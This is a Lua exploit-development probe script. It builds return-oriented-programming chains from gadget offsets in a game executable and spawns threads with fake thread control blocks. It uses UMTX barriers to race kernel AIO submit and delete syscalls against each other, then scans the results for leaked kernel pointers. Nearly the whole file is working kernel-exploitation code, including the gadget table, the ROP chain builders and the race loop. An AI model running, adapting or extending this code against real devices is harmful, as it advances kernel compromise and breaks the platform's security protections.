-- CRASH_CLASS: HIGH
-- PROBE 70b: barrier-synced submit-during-delete with FIXED UMTX ops
--
-- 69i used UMTX_OP = 1 (deprecated UNLOCK, returns immediately).
-- Engram survey #2742 confirms: WAIT=2, WAKE=3, WAIT_UINT_PRIVATE=15,
-- WAKE_PRIVATE=16. The barrier never blocked — both children serialized.
--
-- Phase A: verify barrier (WAIT op=2 + WAKE op=3)
-- Phase B: AIO sanity
-- Phase C: 128 IDs × 128 submits × 20 iters with real barrier
-- Phase D: summary

print("=== PROBE 70b: fixed barrier race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- Gadgets (confirmed probes 271g/396f)
local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_pop_rcx   = eb + 0xE64
local g_pop_r8    = eb + 0x991    -- bytes 47 58 C3 (REX.RXB)
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67  -- mov [rdi], rax; ret

-- Mask signals that kill on absent/faulting syscalls
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
for _, sig in ipairs({10, 11, 12, 13, 14}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Fake TCB for child threads (sysarch SET_FSBASE=129)
local tcb_page = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do wq(N(tcb_page) + i, uint64(N(tcb_page))) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(tcb_page)))

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

-- UMTX ops (confirmed by engram survey #2742)
local UMTX_OP_WAIT          = 2
local UMTX_OP_WAKE          = 3
local UMTX_OP_WAKE_PRIVATE  = 16

local function wake_barrier(addr)
    wd(addr, 1)
    pcall(function()
        mk(454)(uint64(addr), uint64(UMTX_OP_WAKE), uint64(0x7FFFFFFF), uint64(0), uint64(0))
    end)
    pcall(function()
        mk(454)(uint64(addr), uint64(UMTX_OP_WAKE_PRIVATE), uint64(0x7FFFFFFF), uint64(0), uint64(0))
    end)
end

--------------------------------------------------------------
-- [A] BARRIER SANITY
--------------------------------------------------------------
print("")
print("[A] barrier: WAIT(2) + WAKE(3)")

local bt = memory.alloc(8)
local mt = memory.alloc(8)
local wr = memory.alloc(8)
wd(N(bt), 0)
wq(N(mt), uint64(0))
wq(N(wr), uint64(0xDEADDEAD))

local ts = memory.alloc(0x4000)
local tsb = N(ts)
local tsp = tsb + 0x2000 - ((tsb + 0x2000) % 16) - 8
for i = 0, 0x27F8, 4 do wd(tsb + i, 0) end
local to = 0
local function te(v) wq(tsp + to, v); to = to + 8 end
-- sysarch TCB
te(g_pop_rdi); te(uint64(129))
te(g_pop_rsi); te(uint64(N(tcb_ptr)))
te(g_pop_rax); te(uint64(165))
te(stub)
-- UMTX_OP_WAIT(2): 454(barrier, 2, expected=0, NULL, NULL)
te(g_pop_rdi); te(uint64(N(bt)))
te(g_pop_rsi); te(uint64(UMTX_OP_WAIT))
te(g_pop_rdx); te(uint64(0))
te(g_pop_rcx); te(uint64(0))
te(g_pop_r8);  te(uint64(0))
te(g_pop_rax); te(uint64(454))
te(stub)
-- capture WAIT return value (still in RAX after stub)
te(g_pop_rdi); te(uint64(N(wr)))
te(g_mov_m_rax)
-- write marker
te(g_pop_rax); te(uint64(0xBEEF0001))
te(g_pop_rdi); te(uint64(N(mt)))
te(g_mov_m_rax)
-- thr_exit
te(g_pop_rdi); te(uint64(0))
te(g_pop_rax); te(uint64(431))
te(stub)

local tp = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(tp) + i, 0) end
wq(N(tp), g_bare_ret)
wq(N(tp) + 0x10, uint64(tsb))
wq(N(tp) + 0x18, uint64(0x2000))
local tt = memory.alloc(8); wq(N(tt), uint64(0))
wq(N(tp) + 0x30, tt)
pcall(function() mk(455)(tp, uint64(0x38)) end)

for w = 1, 10000 do local _ = rd(tsb) end

local pre = rd(N(mt))
print("  pre-wake: marker=0x" .. string.format("%X", pre or 0))
if pre ~= 0 then
    print("  *** WAIT(2) did NOT block — trying WAIT_UINT_PRIVATE(15) ***")
end

wake_barrier(N(bt))
for w = 1, 50000 do local _ = rd(tsb) end

local post = rd(N(mt))
local wret = fmt(rq(N(wr)))
print("  post-wake: marker=0x" .. string.format("%X", post or 0) .. " ret=" .. wret)

local barrier_ok = (pre == 0 and (post or 0) == 0xBEEF0001)
if barrier_ok then
    print("  BARRIER WORKS: child blocked on WAIT(2), woke on WAKE(3)")
elseif pre ~= 0 then
    print("  WAIT(2) passed through — will test op 15 next")
else
    print("  WAKE FAILED: child blocked but wake didn't reach it")
end

-- Fallback test with WAIT_UINT_PRIVATE(15) if op 2 didn't block
local use_wait_op = UMTX_OP_WAIT
if not barrier_ok and pre ~= 0 and alive() then
    print("")
    print("[A2] fallback: WAIT_UINT_PRIVATE(15)")
    wd(N(bt), 0)
    wq(N(mt), uint64(0))
    wq(N(wr), uint64(0xDEADDEAD))

    to = 0
    for i = 0, 0x27F8, 4 do wd(tsb + i, 0) end
    te(g_pop_rdi); te(uint64(129))
    te(g_pop_rsi); te(uint64(N(tcb_ptr)))
    te(g_pop_rax); te(uint64(165))
    te(stub)
    te(g_pop_rdi); te(uint64(N(bt)))
    te(g_pop_rsi); te(uint64(15))  -- WAIT_UINT_PRIVATE
    te(g_pop_rdx); te(uint64(0))
    te(g_pop_rcx); te(uint64(0))
    te(g_pop_r8);  te(uint64(0))
    te(g_pop_rax); te(uint64(454))
    te(stub)
    te(g_pop_rdi); te(uint64(N(wr)))
    te(g_mov_m_rax)
    te(g_pop_rax); te(uint64(0xBEEF0002))
    te(g_pop_rdi); te(uint64(N(mt)))
    te(g_mov_m_rax)
    te(g_pop_rdi); te(uint64(0))
    te(g_pop_rax); te(uint64(431))
    te(stub)

    wq(N(tt), uint64(0))
    pcall(function() mk(455)(tp, uint64(0x38)) end)
    for w = 1, 10000 do local _ = rd(tsb) end
    pre = rd(N(mt))
    print("  pre-wake: marker=0x" .. string.format("%X", pre or 0))
    wake_barrier(N(bt))
    for w = 1, 50000 do local _ = rd(tsb) end
    post = rd(N(mt))
    wret = fmt(rq(N(wr)))
    print("  post-wake: marker=0x" .. string.format("%X", post or 0) .. " ret=" .. wret)
    if pre == 0 and (post or 0) == 0xBEEF0002 then
        print("  BARRIER WORKS with op 15!")
        use_wait_op = 15
        barrier_ok = true
    else
        print("  ALSO FAILED — continuing without barrier")
    end
end

if not alive() then print("DEAD after Phase A"); return end

--------------------------------------------------------------
-- [B] AIO SANITY
--------------------------------------------------------------
print("")
print("[B] AIO sanity")

local BATCH = 128
local SUB_COUNT = 128

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end

local sanity_id = submit_one()
poll_one(sanity_id)
wd(N(one_id), sanity_id); wd(N(one_st), 0xDEAD)
pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
print("  state=0x" .. string.format("%X", rd(N(one_st)) or 0))
if not alive() then print("DEAD"); return end

--------------------------------------------------------------
-- [C] RACE
--------------------------------------------------------------
print("")
print("[C] RACE: " .. BATCH .. " IDs × " .. SUB_COUNT .. " submits × 20 iters, WAIT op=" .. use_wait_op)

local del_ids    = memory.alloc(4 * BATCH + 0x10)
local del_states = memory.alloc(4 * BATCH + 0x10)
local marker_del = memory.alloc(8)
local marker_sub = memory.alloc(8)
local sub_done   = memory.alloc(8)
local del_done   = memory.alloc(8)
local barrier    = memory.alloc(8)

local sub_reqs   = memory.alloc(0x30)
local sub_data   = memory.alloc(0x1000)
local sub_result = memory.alloc(0x100)
local sub_ids    = memory.alloc(4 * SUB_COUNT + 0x10)

wq(N(sub_reqs), uint64(0))
wq(N(sub_reqs) + 8, uint64(16))
local sdh, sdl = get_hi_lo(uint64(N(sub_data)))
wd(N(sub_reqs) + 0x10, sdl); wd(N(sub_reqs) + 0x14, sdh)
local srh, srl = get_hi_lo(uint64(N(sub_result)))
wd(N(sub_reqs) + 0x18, srl); wd(N(sub_reqs) + 0x1C, srh)
wd(N(sub_reqs) + 0x20, fd_zero); wd(N(sub_reqs) + 0x24, 0)

-- Pre-allocate stacks (reused across iterations)
local stk_B = memory.alloc(0x20000)  -- submitter: needs ~14KB for 128× ROP
local sb_B = N(stk_B)
local stk_A = memory.alloc(0x4000)   -- deleter: needs ~400B
local sb_A = N(stk_A)

-- Pre-allocate thr_param structs
local par_B = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
wq(N(par_B), g_bare_ret)
wq(N(par_B) + 0x10, uint64(sb_B))
wq(N(par_B) + 0x18, uint64(0x6000))  -- stack_size → RSP at ~+0x6000
local tB = memory.alloc(8)
wq(N(par_B) + 0x30, tB)

local par_A = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
wq(N(par_A), g_bare_ret)
wq(N(par_A) + 0x10, uint64(sb_A))
wq(N(par_A) + 0x18, uint64(0x2000))  -- stack_size → RSP at ~+0x2000
local tA = memory.alloc(8)
wq(N(par_A) + 0x30, tA)

local ITERS = 20
local total_collisions = 0
local total_anomalies = 0
local total_kptrs = 0
local total_del_ok = 0
local total_del_count = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: DEAD", iter))
        break
    end

    -- Submit + poll BATCH AIO requests
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_one(id)
            table.insert(ids, id)
        end
    end
    if #ids < 2 then
        print(string.format("  iter %d: only %d IDs", iter, #ids))
        break
    end
    local count = #ids

    -- Fill shared buffers
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(del_states) + i * 4, 0xDDDDDDDD)
    end
    for i = 0, SUB_COUNT - 1 do wd(N(sub_ids) + i * 4, 0) end
    wq(N(marker_del), uint64(0))
    wq(N(marker_sub), uint64(0))
    wq(N(sub_done), uint64(0))
    wq(N(del_done), uint64(0))
    wd(N(barrier), 0)

    -- ============ BUILD SUBMITTER CHAIN (child B) ============
    local rsp_B = sb_B + 0x6000 - ((sb_B + 0x6000) % 16) - 8
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end

    -- sysarch(SET_FSBASE=129, &tcb_ptr)
    emB(g_pop_rdi); emB(uint64(129))
    emB(g_pop_rsi); emB(uint64(N(tcb_ptr)))
    emB(g_pop_rax); emB(uint64(165))
    emB(stub)
    -- UMTX_OP_WAIT: 454(barrier, op, expected=0, 0, 0)
    emB(g_pop_rdi); emB(uint64(N(barrier)))
    emB(g_pop_rsi); emB(uint64(use_wait_op))
    emB(g_pop_rdx); emB(uint64(0))
    emB(g_pop_rcx); emB(uint64(0))
    emB(g_pop_r8);  emB(uint64(0))
    emB(g_pop_rax); emB(uint64(454))
    emB(stub)
    -- marker: submitter passed barrier
    emB(g_pop_rax); emB(uint64(0x5B517E01))
    emB(g_pop_rdi); emB(uint64(N(marker_sub)))
    emB(g_mov_m_rax)
    -- 128× 669(cmd=1, reqs, count=1, class=1, &ids[i])
    for si = 0, SUB_COUNT - 1 do
        emB(g_pop_rdi); emB(uint64(1))
        emB(g_pop_rsi); emB(uint64(N(sub_reqs)))
        emB(g_pop_rdx); emB(uint64(1))
        emB(g_pop_rcx); emB(uint64(1))
        emB(g_pop_r8);  emB(uint64(N(sub_ids) + si * 4))
        emB(g_pop_rax); emB(uint64(669))
        emB(stub)
    end
    -- done marker
    emB(g_pop_rax); emB(uint64(0xD04E0069))
    emB(g_pop_rdi); emB(uint64(N(sub_done)))
    emB(g_mov_m_rax)
    -- thr_exit(0)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- ============ BUILD DELETER CHAIN (child A) ============
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end

    emA(g_pop_rdi); emA(uint64(129))
    emA(g_pop_rsi); emA(uint64(N(tcb_ptr)))
    emA(g_pop_rax); emA(uint64(165))
    emA(stub)
    -- UMTX_OP_WAIT
    emA(g_pop_rdi); emA(uint64(N(barrier)))
    emA(g_pop_rsi); emA(uint64(use_wait_op))
    emA(g_pop_rdx); emA(uint64(0))
    emA(g_pop_rcx); emA(uint64(0))
    emA(g_pop_r8);  emA(uint64(0))
    emA(g_pop_rax); emA(uint64(454))
    emA(stub)
    -- marker: deleter passed barrier
    emA(g_pop_rax); emA(uint64(0xDE1E7E01))
    emA(g_pop_rdi); emA(uint64(N(marker_del)))
    emA(g_mov_m_rax)
    -- 662(del_ids, count, del_states)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(del_states)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    -- done marker
    emA(g_pop_rax); emA(uint64(0xD047E001))
    emA(g_pop_rdi); emA(uint64(N(del_done)))
    emA(g_mov_m_rax)
    -- thr_exit(0)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- Spawn submitter FIRST (so it enters WAIT first)
    wq(N(tB), uint64(0))
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    -- Then deleter
    wq(N(tA), uint64(0))
    pcall(function() mk(455)(par_A, uint64(0x38)) end)

    -- Let both reach UMTX_OP_WAIT
    for w = 1, 10000 do local _ = rd(sb_A) end

    -- RELEASE BARRIER: write 1 + wake all
    wake_barrier(N(barrier))

    -- Wait for both to finish
    for w = 1, 100000 do local _ = rd(sb_A) end

    -- ============ CHECK RESULTS ============
    local del_ran = (N(rq(N(marker_del))) ~= 0)
    local sub_ran = (N(rq(N(marker_sub))) ~= 0)
    local sub_fin = (N(rq(N(sub_done))) ~= 0)
    local del_fin = (N(rq(N(del_done))) ~= 0)

    local del_ok, del_fail, del_sent, del_weird = 0, 0, 0, 0
    for i = 0, count - 1 do
        local st = rd(N(del_states) + i * 4) or 0xDDDDDDDD
        if st == 0 then del_ok = del_ok + 1
        elseif st == 0xDDDDDDDD then del_sent = del_sent + 1
        elseif st == 0x80020003 or st == 0x80020010 then del_fail = del_fail + 1
        else del_weird = del_weird + 1 end
    end
    total_del_ok = total_del_ok + del_ok
    total_del_count = total_del_count + count

    local new_ids = {}
    for i = 0, SUB_COUNT - 1 do
        local nid = rd(N(sub_ids) + i * 4) or 0
        if nid ~= 0 then table.insert(new_ids, nid) end
    end

    local old_set = {}
    for _, id in ipairs(ids) do old_set[id % 8192] = id end
    local collisions = 0
    for _, nid in ipairs(new_ids) do
        if old_set[nid % 8192] then collisions = collisions + 1 end
    end

    local kptr_hits = 0
    for _, nid in ipairs(new_ids) do
        local h, l = get_hi_lo(uint64(nid))
        if h >= 0xFFFF8000 then kptr_hits = kptr_hits + 1 end
    end

    total_collisions = total_collisions + collisions
    total_anomalies = total_anomalies + del_weird
    total_kptrs = total_kptrs + kptr_hits

    local tag = ""
    if del_weird > 0 then tag = tag .. " ***WEIRD***" end
    if kptr_hits > 0 then tag = tag .. " ***KPTR***" end
    if del_ok < count and del_sent == 0 and del_fail > 0 then
        tag = tag .. " ***PARTIAL***"
    end

    print(string.format("  iter %d: d=%s/%s s=%s/%s ok=%d fail=%d sent=%d w=%d | new=%d coll=%d k=%d%s",
        iter,
        del_ran and "Y" or "N", del_fin and "Y" or "N",
        sub_ran and "Y" or "N", sub_fin and "Y" or "N",
        del_ok, del_fail, del_sent, del_weird,
        #new_ids, collisions, kptr_hits, tag))

    if del_weird > 0 then
        for i = 0, count - 1 do
            local st = rd(N(del_states) + i * 4) or 0
            if st ~= 0 and st ~= 0xDDDDDDDD and st ~= 0x80020003 and st ~= 0x80020010 then
                print(string.format("    w[%d] id=0x%X st=0x%08X", i, ids[i+1], st))
            end
        end
    end

    -- Wide buffer readback on colliding IDs (check for kptrs in AIO objects)
    if collisions > 0 then
        local wb = memory.alloc(0x100)
        local wbst = memory.alloc(0x100)
        for _, nid in ipairs(new_ids) do
            if old_set[nid % 8192] then
                -- try 663 (wait) with wide buffer to read state
                for i = 0, 0xFC, 4 do wd(N(wb) + i, 0xAAAAAAAA) end
                wd(N(wb), nid)
                for i = 0, 0xFC, 4 do wd(N(wbst) + i, 0xBBBBBBBB) end
                pcall(function()
                    mk(663)(uint64(N(wb)), uint64(1), uint64(N(wbst)), uint64(0), uint64(0))
                end)
                -- scan wbst for kernel pointers
                for off = 0, 0x3C, 4 do
                    local v = rd(N(wbst) + off) or 0
                    if v ~= 0xBBBBBBBB and v ~= 0 then
                        local vh = rd(N(wbst) + off + 4) or 0
                        if vh >= 0xFFFF8000 then
                            print(string.format("    *** KPTR at wbst+0x%X: 0x%08X%08X (id=0x%X) ***",
                                off, vh, v, nid))
                            total_kptrs = total_kptrs + 1
                        end
                    end
                end
            end
        end
    end

    -- Cleanup newly submitted IDs
    for _, nid in ipairs(new_ids) do
        poll_one(nid)
        wd(N(one_id), nid); wd(N(one_st), 0)
        pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    end
end

--------------------------------------------------------------
-- [D] SUMMARY
--------------------------------------------------------------
print("")
print("[D] SUMMARY")
print(string.format("  wait_op=%d batch=%d submits=%d iters=%d", use_wait_op, BATCH, SUB_COUNT, ITERS))
print(string.format("  del_ok/total = %d/%d (%.1f%%)", total_del_ok, total_del_count,
    total_del_count > 0 and (total_del_ok * 100 / total_del_count) or 0))
print(string.format("  collisions=%d anomalies=%d kptrs=%d", total_collisions, total_anomalies, total_kptrs))
print(string.format("  process=%s", alive() and "ALIVE" or "DEAD"))

if total_kptrs > 0 then
    print("*** KERNEL POINTER FOUND ***")
elseif total_anomalies > 0 then
    print("*** ANOMALOUS DELETE STATES ***")
elseif total_collisions > 0 then
    print("*** SLOT COLLISIONS — submit interleaved with delete ***")
elseif barrier_ok then
    print("barrier worked but 0 collisions — 662 may hold lock for full batch")
else
    print("barrier did NOT work — results same as 69h/69i (no sync)")
end

print("=== 70b COMPLETE ===")
